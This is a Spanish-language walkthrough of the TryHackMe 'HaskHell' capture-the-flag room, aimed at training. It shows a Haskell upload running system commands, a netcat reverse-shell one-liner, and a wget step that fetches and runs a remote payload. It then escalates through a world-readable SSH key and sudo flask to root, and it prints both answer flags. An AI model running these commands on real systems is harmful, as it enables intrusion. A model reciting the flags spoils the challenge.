# HaskHell

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF | haskhell | https://tryhackme.com/room/haskhell | 02 Level Medium | TryHackMe | Haskell, web upload (5001), GoBuster, reverse shell, SSH key world-readable, sudo flask | Compromiso total -> user y root flag |

---

**Contexto:** **HaskHell** es un CTF Medium que introduce el lenguaje funcional Haskell. Se enumera el puerto 5001 (web del curso de programación funcional), se descubre `/submit` con GoBuster y se sube un script `.hs` que ejecuta comandos de sistema (`System.Process` / `callCommand`). Con un payload de reverse shell Python vía `wget` se obtiene una shell como `flask`. Escalada: la clave SSH de `prof` es world-readable; con ella se entra como `prof` y, como puede ejecutar `flask` con sudo (manteniendo `FLASK_APP`), un script Python con `pty.spawn('/bin/bash')` da una shell root. El título del room: "Teach your CS professor that his PhD isn't in security".

## Solucionario

### Task 1: HaskHellTask includes a deployable machine

**Explicación:** Se escanea (22 SSH, 5001 HTTP). La web es la página de un curso de Haskell con un enlace al homework y a un submit que falla (404); GoBuster descubre `/submit`. Solo se aceptan ficheros Haskell (callCommand de System.Process); se prueba `system "ls -la"` y luego se sube un payload que hace `wget` de un script Python de reverse shell y lo ejecuta. El callback llega como `flask`; el flag de usuario está en `/home/prof` (o `/home/*`). LinPEAS revela que la clave SSH privada de `prof` es world-readable: `chmod 600`, `ssh -i key prof@<IP>`, y ahí el user flag. Con `sudo -l`: `(root) /usr/bin/flask run` con `FLASK_APP` en env_keep; se crea `root.py` con `import pty; pty.spawn('/bin/bash')`, se setea `FLASK_APP=root.py` y al correr `sudo /usr/bin/flask run` se obtiene shell root y el root flag.

```haskell
-- test.hs (listar ficheros)
import System.Process
main = callCommand "ls -la"
```
```haskell
-- reverse shell
import System.Cmd
main = system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 8888 >/tmp/f"
```
```bash
gobuster dir -u http://<IP>:5001 -w /usr/share/wordlists/dirb/common.txt
# upload de shell.hs -> wget del payload Python (filter.sock) y ejecución
# linpeas: clave privada de prof world-readable
chmod 600 prof_id_rsa
ssh -i prof_id_rsa prof@<IP>
cat /home/prof/user.txt
sudo -l
# /usr/bin/flask run (root) + FLASK_APP en env_keep
echo 'import pty; pty.spawn("/bin/bash")' > /tmp/root.py
FLASK_APP=/tmp/root.py sudo /usr/bin/flask run --host=0.0.0.0
cat /root/root.txt
```

Respuestas de la tarea:

1. `flag{academic_dishonesty}`
2. `flag{im_purely_functional}`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | Get the flag in the user.txt file. | `flag{academic_dishonesty}` |
| 1.2 | Obtain the flag in root.txt | `flag{im_purely_functional}` |

---

**Metodología:** Escaneo, fuzzing web, subida de código Haskell que invoca procesos del sistema, reverse shell, enumeración de usuarios (flask/haskell/prof), abuso de clave SSH world-readable y de sudo con `/usr/bin/flask run` + `FLASK_APP` persistido (PTES: recon, exploitation, privilege escalation).

**Learning chain:** nmap (22/5001) → página curso Haskell → homeworks → /submit (GoBuster) → upload .hs → callCommand/system → reverse shell Python → flask → linpeas → SSH key de prof world-readable → ssh prof → user flag → sudo flask run (env_keep FLASK_APP) → shell.py pty → root flag.

**Lección:** *Un lenguaje "funcional" no es seguro por defecto: `System.Process` permite ejecutar comandos desde archivos subidos, y una clave SSH world-readable de otro usuario es una escalada inmediata sin password.*

**MITRE ATT&CK:** T1046 Network Service Discovery · T1505.003 Web Shell (upload de código que ejecuta comandos) · T1059 Command and Scripting Interpreter (callCommand/system) · T1552.004 Unsecured Credentials (private key world-readable) · T1068 Exploitation for Privilege Escalation (sudo flask + FLASK_APP).

**Fuente:** [TryHackMe - HaskHell](https://tryhackme.com/room/haskhell)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.